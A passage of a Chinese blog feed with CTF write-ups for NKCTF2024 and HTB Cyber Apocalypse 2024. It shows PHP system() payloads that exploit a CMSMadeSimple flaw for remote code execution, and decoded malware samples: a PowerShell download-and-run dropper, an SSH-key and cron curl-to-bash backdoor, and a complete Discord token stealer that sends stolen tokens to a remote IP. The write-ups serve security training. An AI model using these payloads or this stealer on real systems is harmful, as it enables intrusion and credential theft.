src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262047654.png" alt="image-20240326204710597"></p><pre><code>flag2: 49a0-bd24-</code></pre><h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>现在我们来看上面找到的<code>Secret_Generator</code></p><p>其实这一操作我们在cmd命令行记录中也能看到 </p><pre><code>.\volatility.exe -f E:\Desktop\NKCTF2024\forensics\1z_F0r3ns1c5\1.raw --profile=Win7SP1x64 cmdscan</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403262121893.png" alt="image-20240326212143754"></p><p>我们可以在r-studio里面直接将这个文件夹恢复出来 看到是需要部署docker容器的</p><p>直接进入<code>Secret_Generator\docker</code>文件夹中 看到<code>docker-compose.yml</code> 我们可以使用这个文件利用docker-compose命令来配置docker容器中所需要的所有服务</p><p>安装docker-compose的命令</p><pre><code>curl -L &quot;https://github.com/docker/compose/releases/download/1.29.0/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose</code></pre><p>使用docker-compose命令部署docker容器 </p><pre><code>docker-compose builddocker-compose up</code></pre><p>看到yml文件中的内容是暴露了8080端口 直接访问<code>http://127.0.0.1:8080</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403271931535.png" alt="image-20240327193141461"></p><p>看到页面需要我们上传密文和自定义字体</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403271933242.png" alt="image-20240327193314201"></p><p>前面提到了的等宽字体 那估计这里需要我们提交的字体就是等宽字体了 搜了一下vscode中常见的等宽字体 有<code>Fria Code</code> <code>Consolas</code> <code>Courier New</code> 这里我们下一个<code>Fria Code</code>字体就行  在上传的时候随便上传一个Fria Code字体就行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403272046411.png" alt="image-20240327204617379"></p><p><a href="https://blog.csdn.net/hardwork617s/article/details/110789055?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171154027016800192212041%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=171154027016800192212041&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-110789055-null-null.142%5Ev100%5Epc_search_result_base9&utm_term=Fira%20Code&spm=1018.2226.3001.4187">下载安装配置Fria Code字体</a></p><p>这里就有点脑洞了 我们拿到的附件里面<code>某段flag</code>文件夹中 有个<code>pass.png</code>图片 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403272045172.png" alt="image-20240327204528145"></p><p>我们随便上传一个字体和一段字符  发现会给我们生成一张图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403272047981.png" alt="image-20240327204702926"></p><p>我们发现输入的是<code>123456</code>但是生成的图片中的内容多了一段<code>pass </code>内容  和<code>pass.png</code>中的内容类似了 而且文件夹中的<code>secret</code>大小刚好为1MB 一眼VC容器 我们需要利用网页生成字典文件 通过对照将pass.png中的VC容器挂载密码恢复出来 </p><p>直接在容器文件夹中找到生成图片的后台代码 在<code>\app\app.py</code>中</p><pre><code class="py">def generate_secret_image():    try:        secret = request.form.get(&#39;secret&#39;)        if not re.match(&quot;^[a-zA-Z0-9]+$&quot;, secret):            return jsonify(&#123;&#39;error&#39;: &#39;Secret text can only contain letters and numbers.&#39;&#125;), 400                secret = &#39;pass &#39; + secret        font_file = request.files.get(&#39;font&#39;)                if font_file:            font_extension = font_file.filename.rsplit(&#39;.&#39;, 1)[1].lower()            if font_extension not in ALLOWED_FONT_TYPES:                return jsonify(&#123;&#39;error&#39;: &#39;Invalid font file type. Only TTF, OTF, WOFF, WOFF2 files are allowed.&#39;&#125;), 400                        if font_file.content_length &gt; (10 * 1024 * 1024):                return jsonify(&#123;&#39;error&#39;: &#39;The font file is too large!&#39;&#125;), 400                        font_filename = str(uuid.uuid4()) + &#39;.&#39; + font_extension            font_path = save_font_file(font_file, font_filename)            font = ImageFont.truetype(font_path, 49, encoding=&#39;utf-8&#39;)        else:            return jsonify(&#123;&#39;error&#39;: &#39;Please select a font file.&#39;&#125;), 400                H = 60        W = 30        canvas = Image.new(&#39;RGB&#39;, (W * len(secret), H), (255, 255, 255))        pen = ImageDraw.Draw(canvas)        pen.text((0, 0), secret, &#39;black&#39;, font)        original_canvas = canvas.copy()        for i in range(5, len(secret)-1):            mosaic_img(canvas, W*i, 0, W*i+W, H//2)            mosaic_img(canvas, W*i, H//2, W*i+W, H)                original_img_base64 = image_to_base64(original_canvas)        secret_img_base64 = image_to_base64(canvas)                return jsonify(&#123;&#39;original_image&#39;: original_img_base64, &#39;secret_image&#39;: secret_img_base64&#125;)    except Exception as e:        print(&quot;An error occurred:&quot;, e)        return jsonify(&#123;&#39;error&#39;: &#39;Internal Server Error&#39;&#125;), 500</code></pre><p>其中关键的就是</p><pre><code class="python">secret = &#39;pass &#39; + secretfor i in range(5, len(secret)-1):            mosaic_img(canvas, W*i, 0, W*i+W, H//2)            mosaic_img(canvas, W*i, H//2, W*i+W, H)</code></pre><p>他读取了我们输入的内容作为<code>secret</code>的值 但是还在前面加了<code>pass </code> 同时将secret的内容从第五个字符到倒数第二个字符这部分内容打上马赛克</p><p>我们对代码进行修改 删掉<code>secret = &#39;pass &#39; + secret</code></p><pre><code>for i in range(len(secret)):            mosaic_img(canvas, W*i, 0, W*i+W, H//2)            mosaic_img(canvas, W*i, H//2, W*i+W, H)</code></pre><p>在尝试一下输入<code>ABCDEFG</code> 发现输出的图片上就只有<code>ABCDEFG</code>了 并且会全部被打上马赛克</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403281257248.png" alt="image-20240328125714210"></p><p>下面就是生成字典图片 输入<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403281257085.png" alt="image-20240328125746993"></p><p>然后我们将字典图片和pass.png都按字符进行分割 直接调gpt就行 </p><pre><code>帮我按照以下要求 写一段代码 我现在有一个1860*60的图片 请你帮我分割成30*60的小图片 放进dict文件夹中 命名规则按照如下顺序ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789  一共是62张小图片 最后 如果文件名为大写字母则为 “文件名-大写.png”</code></pre><pre><code class="python">from PIL import Imageimport osdef split_image(image_path, output_folder, width=30, height=60):    image = Image.open(image_path)    image_width, image_height = image.size    if image_width % width != 0 or image_height % height != 0:        print(&quot;Error: Invalid dimensions for splitting.&quot;)        return    num_columns = image_width // width    num_rows = image_height // height    if not os.path.exists(output_folder):        os.makedirs(output_folder)    chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;    char_index = 0    for col in range(num_columns):        for row in range(num_rows):            left = col * width            upper = row * height            right = left + width            lower = upper + height            cropped_image = image.crop((left, upper, right, lower))                        char = chars[char_index]            if char.isupper():                filename = f&quot;&#123;char&#125;-大写.png&quot;            else:                filename = f&quot;&#123;char&#125;.png&quot;                            cropped_image.save(os.path.join(output_folder, filename))            char_index += 1if __name__ == &quot;__main__&quot;:    input_image_path = &quot;dict2.png&quot; # 某段flag/pass.png    output_folder = &quot;dict1&quot;        # dict2    split_image(input_image_path, output_folder)</code></pre><p>然后就是利用哈希计算和字典 匹配出pass.png中的密码</p><pre><code class="python">import osimport hashlibdef calculate_hashes(folder):    hash_dict = &#123;&#125;    for filename in os.listdir(folder):        filepath = os.path.join(folder, filename)        if os.path.isfile(filepath):            with open(filepath, &#39;rb&#39;) as f:                image_data = f.read()                hash_value = hashlib.md5(image_data).hexdigest()                hash_dict[filename[:-4:]] = hash_value    return hash_dictdef find_matching_images(dict1, dict2):    matches = []    for filename, hash_value in dict2.items():        if hash_value in dict1.values():            matching_filename = [name for name, hash_val in dict1.items() if hash_val == hash_value][0]            matches.append(matching_filename)    return matchesif __name__ == &quot;__main__&quot;:    dict1_folder = &quot;dict1&quot;     dict2_folder = &quot;dict2&quot;     dict1_hashes = calculate_hashes(dict1_folder)    dict2_hashes = calculate_hashes(dict2_folder)    matching_images = find_matching_images(dict1_hashes, dict2_hashes)        print(&quot;Matching images found in dict1:&quot;)    for image in matching_images:        print(image)&#39;&#39;&#39;Matching images found in dict1:b143a6268e2a23&#39;&#39;&#39;</code></pre><p>dict2中14个被打马赛克的字符匹配出来的结果是<code>b143a6268e2a23</code>  再加上原来没有被打马赛克的字符 VC容器的密码就是<code>b143a6268e2a233</code>  直接进行挂载 得到flag3</p><pre><code>c4f222879312</code></pre><p>组合起来就是</p><pre><code>nkctf&#123;39c429eb-2faf49a0-bd24-c4f222879312&#125;</code></pre><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="my-first-cms-CVE-2024-27622"><a href="#my-first-cms-CVE-2024-27622" class="headerlink" title="my first cms(CVE-2024-27622)"></a>my first cms(CVE-2024-27622)</h3><p>首先dirsearch扫目录 扫到后台登陆页面<code>admin/login.php</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242112791.png" alt="image-20240324211243701"></p><p>抓个包开始爆破登陆密码 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242115397.png" alt="image-20240324211527287"></p><p>比较抽象是<code>admin/Admin123</code> 登陆后台 </p><p>注意到这个<code>CMSMadeSimple</code>框架的版本是2.2.19  搜一波漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242120123.png" alt="image-20240324212044011"></p><p><a href="https://github.com/capture0x/CMSMadeSimple">CVE-2024-27622</a></p><p>直接进行利用 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242122358.png" alt="image-20240324212227274"></p><p> 先抓<code>&lt;?php echo system(&#39;id&#39;); ?&gt;</code>测试一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242123611.png" alt="image-20240324212348525"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242124243.png" alt="image-20240324212408092"></p><p>成功回显 再看一下根目录 </p><pre><code>&lt;?php system(&quot;ls /&quot;); ?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242127820.png" alt="image-20240324212741748"></p><p>读取flag</p><pre><code>&lt;?php system(&quot;cat /_fffff1@g&quot;); ?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403242128199.png" alt="image-20240324212836091"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NKCTF2024&quot;&gt;&lt;a href=&quot;#NKCTF2024&quot; class=&quot;headerlink&quot; title=&quot;NKCTF2024&quot;&gt;&lt;/a&gt;NKCTF2024&lt;/h1&gt;&lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="web" scheme="http://w3nx1z1.github.io/tags/web/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>HTBCyberCTF2024</title>
    <link href="http://w3nx1z1.github.io/2024/03/16/Cyber%20Apocalypse%202024%20Hacker%20Royale/"/>
    <id>http://w3nx1z1.github.io/2024/03/16/Cyber%20Apocalypse%202024%20Hacker%20Royale/</id>
    <published>2024-03-16T11:52:36.682Z</published>
    <updated>2024-03-30T02:57:25.508Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTBCyberCTF2024"><a href="#HTBCyberCTF2024" class="headerlink" title="HTBCyberCTF2024"></a>HTBCyberCTF2024</h1><h2 id="Forensics-部分"><a href="#Forensics-部分" class="headerlink" title="Forensics(部分)"></a>Forensics(部分)</h2><h3 id="Urgent"><a href="#Urgent" class="headerlink" title="Urgent"></a>Urgent</h3><p>给的附件是一个xml文件 直接notepad打开 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403111402394.png" alt="image-20240311140231315"></p><p>解base64</p><pre><code>document.write(unescape(&#39;&gt;_ 404 Not FoundSub window_onloadconst impersonation = 3Const HIDDEN_WINDOW = 12Set Locator = CreateObject(&quot;WbemScripting.SWbemLocator&quot;)Set Service = Locator.ConnectServer()Service.Security_.ImpersonationLevel=impersonationSet objStartup = Service.Get(&quot;Win32_ProcessStartup&quot;)Set objConfig = objStartup.SpawnInstance_Set Process = Service.Get(&quot;Win32_Process&quot;)Error = Process.Create(&quot;cmd.exe /c powershell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile(&#39;https://standunited.htb/online/forms/form1.exe&#39;,&#39;%appdata%\form1.exe&#39;);Start-Process &#39;%appdata%\form1.exe&#39;;$flag=&#39;HTB&#123;4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT&#125;&quot;, null, objConfig, intProcessID)window.close()end sub&#39;));</code></pre><p>拿到flag</p><h3 id="It-Has-Begun"><a href="#It-Has-Begun" class="headerlink" title="It Has Begun"></a>It Has Begun</h3><pre><code>The Fray is upon us, and the very first challenge has been released! Are you ready factions!? Considering this is just the beginning, if you cannot musted the teamwork needed this early, then your doom is likely inevitable.</code></pre><p>直接仔细翻看给的script.sh  找到两段关键的</p><pre><code>echo &quot;ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w&#123;BTH&quot; &gt;&gt; /root/.ssh/authorized_keysecho &quot;*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c &#39;NG5kX3kwdVJfR3IwdU5kISF9&#39; &quot; &gt;&gt; /etc/crontab</code></pre><p>第一段flag</p><pre><code>HTB&#123;w1ll_y0u_St</code></pre><p>第二段是解base64<code>NG5kX3kwdVJfR3IwdU5kISF9</code></p><pre><code>4nd_y0uR_Gr0uNd!!&#125;</code></pre><h3 id="An-unusual-sighting"><a href="#An-unusual-sighting" class="headerlink" title="An unusual sighting"></a>An unusual sighting</h3><pre><code>As the preparations come to an end, and The Fray draws near each day, our newly established team has started work on refactoring the new CMS application for the competition. However, after some time we noticed that a lot of our work mysteriously has been disappearing! We managed to extract the SSH Logs and the Bash History from our dev server in question. The faction that manages to uncover the perpetrator will have a massive bonus come competition!随着准备工作的结束，以及 The Fray 的临近，我们新成立的团队已经开始为比赛重构新的 CMS 应用程序。然而，一段时间后，我们注意到我们的很多工作都神秘地消失了！我们设法从有问题的开发服务器中提取了 SSH 日志和 Bash 历史记录。设法发现肇事者的派系将获得巨大的奖金！</code></pre><p>使用nc连接docker容器 </p><p>第一个问题</p><pre><code>What is the IP Address and Port of the SSH Server (IP:PORT)</code></pre><p>问的是通过ssh连接的ip和端口是什么 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151122502.png" alt="image-20240315112236452"></p><p>看到第三行的连接记录 前面的ip和端口是发起连接的 后面的ip和端口是连接的目标 后面的记录都是如此 那后面的ip和端口就是想通过ssh进行连接的ip和端口</p><pre><code>100.107.36.130:2221</code></pre><p>第二个问题</p><pre><code>What time is the first successful Login</code></pre><p>问的是第一次成功连接的时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151126225.png" alt="image-20240315112617183"></p><p>可以看到第一次连接是失败了 第二次连接成功 那第二次连接就是第一次成功连接 </p><pre><code>2024-02-13 11:29:50</code></pre><p>第三个问题</p><pre><code>What is the time of the unusual Login</code></pre><p>问的是非常规登陆的时间 </p><p>这里可能问的是特殊ip的登陆  只有一个特殊ip<code>2.67.182.119</code> 看着很像挖矿病毒或者攻击者的外部ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151603252.png" alt="image-20240315160355183"></p><pre><code>2024-02-19 04:00:14</code></pre><p>第四个问题</p><pre><code>What is the Fingerprint of the attacker&#39;s public key</code></pre><p>承接上一题 </p><pre><code>OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4</code></pre><p>第五个问题</p><pre><code>What is the first command the attacker executed after logging in</code></pre><p>问的是攻击者在登陆之后执行的第一个命令是什么</p><p>看<code>bash_history.txt</code> 由第三个问题知道攻击者是在<code>2024-02-19 04:00:14</code>之后登陆的 直接找这个时间对应的命令记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151615339.png" alt="image-20240315161550301"></p><pre><code>whoami</code></pre><p>第六个问题</p><pre><code>What is the final command the attacker executed before logging out</code></pre><p>问的是攻击者在登陆注销前执行的最后一个命令是什么</p><p>看<code>sshd.log</code> 攻击者是在<code>2024-02-19 04:38:17</code> 进行注销的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151618823.png" alt="image-20240315161830759"></p><p>再在<code>bash_history.txt</code>里面看看这个时间前执行的命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151619193.png" alt="image-20240315161928153"></p><pre><code>./setup</code></pre><p>然后就可以拿到flag</p><pre><code>HTB&#123;B3sT_0f_luck_1n_th3_Fr4y!!&#125;</code></pre><h3 id="Fake-Boost"><a href="#Fake-Boost" class="headerlink" title="Fake Boost"></a>Fake Boost</h3><pre><code>In the shadow of The Fray, a new test called &quot;&quot;Fake Boost&quot;&quot; whispers promises of free Discord Nitro perks. It&#39;s a trap, set in a world where nothing comes without a cost. As factions clash and alliances shift, the truth behind Fake Boost could be the key to survival or downfall. Will your faction see through the deception? KORP™ challenges you to discern reality from illusion in this cunning trial.</code></pre><p>在流量包中提取出来一个文件<code>freediscordnitro</code> 查看内容 发现是对一个字符串的处理 </p><pre><code>$s0yAY2gmHVNFd7QZ = $jozeq3n.ToCharArray() ; [array]::Reverse($s0yAY2gmHVNFd7QZ) ; -join $s0yAY2gmHVNFd7QZ 2&gt;&amp;1&gt; $null ;$LOaDcODEoPX3ZoUgP2T6cvl3KEK = [sYSTeM.TeXt.ENcODING]::UTf8.geTSTRiNG([SYSTEm.cOnVeRT]::FRoMBaSe64sTRing(&quot;$s0yAY2gmHVNFd7QZ&quot;)) ;</code></pre><p>先是将字符串进行反转 然后在解base64 </p><pre><code>$URL = &quot;http://192.168.116.135:8080/rj1893rj1joijdkajwda&quot;function Steal &#123;    param (        [string]$path    )    $tokens = @()    try &#123;        Get-ChildItem -Path $path -File -Recurse -Force | ForEach-Object &#123;                        try &#123;                $fileContent = Get-Content -Path $_.FullName -Raw -ErrorAction Stop                foreach ($regex in @(&#39;[\w-]&#123;26&#125;\.[\w-]&#123;6&#125;\.[\w-]&#123;25,110&#125;&#39;, &#39;mfa\.[\w-]&#123;80,95&#125;&#39;)) &#123;                    $tokens += $fileContent | Select-String -Pattern $regex -AllMatches | ForEach-Object &#123;                        $_.Matches.Value                    &#125;                &#125;            &#125; catch &#123;&#125;        &#125;    &#125; catch &#123;&#125;    return $tokens&#125;function GenerateDiscordNitroCodes &#123;    param (        [int]$numberOfCodes = 10,        [int]$codeLength = 16    )    $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;    $codes = @()    for ($i = 0; $i -lt $numberOfCodes; $i++) &#123;        $code = -join (1..$codeLength | ForEach-Object &#123; Get-Random -InputObject $chars.ToCharArray() &#125;)        $codes += $code    &#125;    return $codes&#125;function Get-DiscordUserInfo &#123;    [CmdletBinding()]    Param (        [Parameter(Mandatory = $true)]        [string]$Token    )    process &#123;        try &#123;            $Headers = @&#123;                &quot;Authorization&quot; = $Token                &quot;Content-Type&quot; = &quot;application/json&quot;                &quot;User-Agent&quot; = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36&quot;            &#125;            $Uri = &quot;https://discord.com/api/v9/users/@me&quot;            $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers            return $Response        &#125;        catch &#123;&#125;    &#125;&#125;function Create-AesManagedObject($key, $IV, $mode) &#123;    $aesManaged = New-Object &quot;System.Security.Cryptography.AesManaged&quot;    if ($mode=&quot;CBC&quot;) &#123; $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC &#125;    elseif ($mode=&quot;CFB&quot;) &#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CFB&#125;    elseif ($mode=&quot;CTS&quot;) &#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CTS&#125;    elseif ($mode=&quot;ECB&quot;) &#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB&#125;    elseif ($mode=&quot;OFB&quot;)&#123;$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::OFB&#125;    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7    $aesManaged.BlockSize = 128    $aesManaged.KeySize = 256    if ($IV) &#123;        if ($IV.getType().Name -eq &quot;String&quot;) &#123;            $aesManaged.IV = [System.Convert]::FromBase64String($IV)        &#125;        else &#123;            $aesManaged.IV = $IV        &#125;    &#125;    if ($key) &#123;        if ($key.getType().Name -eq &quot;String&quot;) &#123;            $aesManaged.Key = [System.Convert]::FromBase64String($key)        &#125;        else &#123;            $aesManaged.Key = $key        &#125;    &#125;    $aesManaged&#125;function Encrypt-String($key, $plaintext) &#123;    $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)    $aesManaged = Create-AesManagedObject $key    $encryptor = $aesManaged.CreateEncryptor()    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);    [byte[]] $fullData = $aesManaged.IV + $encryptedData    [System.Convert]::ToBase64String($fullData)&#125;Write-Host &quot;______              ______ _                       _   _   _ _ _               _____  _____  _____   ___ |  ___|             |  _  (_)                     | | | \ | (_) |             / __  \|  _  |/ __  \ /   || |_ _ __ ___  ___  | | | |_ ___  ___ ___  _ __ __| | |  \| |_| |_ _ __ ___   `&#39; / /&#39;| |/&#39; |`&#39; / /&#39;/ /| ||  _| &#39;__/ _ \/ _ \ | | | | / __|/ __/ _ \| &#39;__/ _` | | . ` | | __| &#39;__/ _ \    / /  |  /| |  / / / /_| || | | | |  __/  __/ | |/ /| \__ \ (_| (_) | | | (_| | | |\  | | |_| | | (_) | ./ /___\ |_/ /./ /__\___  |\_| |_|  \___|\___| |___/ |_|___/\___\___/|_|  \__,_| \_| \_/_|\__|_|  \___/  \_____/ \___/ \_____/   |_/                                                                                                                                                                                                                  &quot;Write-Host &quot;Generating Discord nitro keys! Please be patient...&quot;$local = $env:LOCALAPPDATA$roaming = $env:APPDATA$part1 = &quot;SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf&quot;$paths = @&#123;    &#39;Google Chrome&#39; = &quot;$local\Google\Chrome\User Data\Default&quot;    &#39;Brave&#39; = &quot;$local\BraveSoftware\Brave-Browser\User Data\Default\&quot;    &#39;Opera&#39; = &quot;$roaming\Opera Software\Opera Stable&quot;    &#39;Firefox&#39; = &quot;$roaming\Mozilla\Firefox\Profiles&quot;&#125;$headers = @&#123;    &#39;Content-Type&#39; = &#39;application/json&#39;    &#39;User-Agent&#39; = &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36&#39;&#125;$allTokens = @()foreach ($platform in $paths.Keys) &#123;    $currentPath = $paths[$platform]    if (-not (Test-Path $currentPath -PathType Container)) &#123;continue&#125;    $tokens = Steal -path $currentPath    $allTokens += $tokens&#125;$userInfos = @()foreach ($token in $allTokens) &#123;    $userInfo = Get-DiscordUserInfo -Token $token    if ($userInfo) &#123;        $userDetails = [PSCustomObject]@&#123;            ID = $userInfo.id            Email = $userInfo.email            GlobalName = $userInfo.global_name            Token = $token        &#125;        $userInfos += $userDetails    &#125;&#125;$AES_KEY = &quot;Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=&quot;$payload = $userInfos | ConvertTo-Json -Depth 10$encryptedData = Encrypt-String -key $AES_KEY -plaintext $payloadtry &#123;    $headers = @&#123;        &#39;Content-Type&#39; = &#39;text/plain&#39;        &#39;User-Agent&#39; = &#39;Mozilla/5.0&#39;    &#125;    Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData&#125;catch &#123;&#125;Write-Host &quot;Success! Discord Nitro Keys:&quot;$keys = GenerateDiscordNitroCodes -numberOfCodes 5 -codeLength 16$keys | ForEach-Object &#123; Write-Output $_ &#125;</code></pre><p>找到第一部分flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403111908010.png" alt="image-20240311190848912"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403111908936.png" alt="image-20240311190856886"></p><pre><code>HTB&#123;fr33_N17r0G3n_3xp053d!_</code></pre><p>流量包里面还有一个文件<code>rj1893rj1joijdkajwda</code> </p><pre><code>bEG+rGcRyYKeqlzXb0QVVRvFp5E9vmlSSG3pvDTAGoba05Uxvepwv++0uWe1Mn4LiIInZiNC/ES1tS7Smzmbc99Vcd9h51KgA5Rs1t8T55Er5ic4FloBzQ7tpinw99kC380WRaWcq1Cc8iQ6lZBP/yqJuLsfLTpSY3yIeSwq8Z9tusv5uWvd9E9V0Hh2Bwk5LDMYnywZw64hsH8yuE/u/lMvP4gb+OsHHBPcWXqdb4DliwhWwblDhJB4022UC2eEMI0fcHe1xBzBSNyY8xqpoyaAaRHiTxTZaLkrfhDUgm+c0zOEN8byhOifZhCJqS7tfoTHUL4Vh+1AeBTTUTprtdbmq3YUhX6ADTrEBi5gXQbSI5r1wz3r37A71Z4pHHnAoJTO0urqIChpBihFWfYsdoMmO77vZmdNPDo1Ug2jynZzQ/NkrcoNArBNIfboiBnbmCvFc1xwHFGL4JPdje8s3cM2KP2EDL3799VqJw3lWoFX0oBgkFi+DRKfom20XdECpIzW9idJ0eurxLxeGS4JI3n3jl4fIVDzwvdYr+h6uiBUReApqRe1BasR8enV4aNo+IvsdnhzRih+rpqdtCTWTjlzUXE0YSTknxiRiBfYttRulO6zx4SvJNpZ1qOkS1UW20/2xUO3yy76Wh9JPDCV7OMvIhEHDFh/F/jvR2yt9RTFId+zRt12Bfyjbi8ret7QN07dlpIcppKKI8yNzqB4FA==</code></pre><p>不能直接解base64 应该是aes解密 需要找密钥  密钥其实也在上面解base64之后的字符串里面 </p><pre><code>$AES_KEY = &quot;Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=&quot;</code></pre><p>需要解一下base64 </p><pre><code>cWphrNTk9wgWZ93t19jayqnlaDuIeFKi</code></pre><p>这个有点特殊  是CBC模式的解密  但是没有偏移值 好像只有这个网站可以做到</p><p><a href="https://www.devglan.com/online-tools/aes-encryption-decryption">AES解密</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151103552.png" alt="image-20240315110356503"></p><pre><code>ui(wyXØU(î6Nx[    &#123;        &quot;ID&quot;:  &quot;1212103240066535494&quot;,        &quot;Email&quot;:  &quot;YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9&quot;,        &quot;GlobalName&quot;:  &quot;phreaks_admin&quot;,        &quot;Token&quot;:  &quot;MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk&quot;    &#125;,    &#123;        &quot;ID&quot;:  &quot;1212103240066535494&quot;,        &quot;Email&quot;:  &quot;YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9&quot;,        &quot;GlobalName&quot;:  &quot;phreaks_admin&quot;,        &quot;Token&quot;:  &quot;MoIxtjEwMz20M5ArNjUzNTQ5NA.Gw3-GW.bGyEkOVlZCsfQ8-6FQnxc9sMa15h7UP3cCOFNk&quot;    &#125;]</code></pre><p>里面的 <code>Email</code> 部分再解base64就是flag2</p><pre><code>b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5&#125;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403151106059.png" alt="image-20240315110637977"></p><pre><code>HTB&#123;fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5&#125;</code></pre><h3 id="Phreaky"><a href="#Phreaky" class="headerlink" title="Phreaky"></a>Phreaky</h3><p>先看协议分级  主要是tcp协议</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403122000172.png" alt="image-20240312200010100"></p><p>直接追踪tcp流  看到从第一个包开始 奇数包都传输了一个压缩包 密码直接在包中显示出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403122002053.png" alt="image-20240312200230965"></p><p>一共有15个这样的压缩包  将字符串提取出来 先解base64 在另存为压缩包 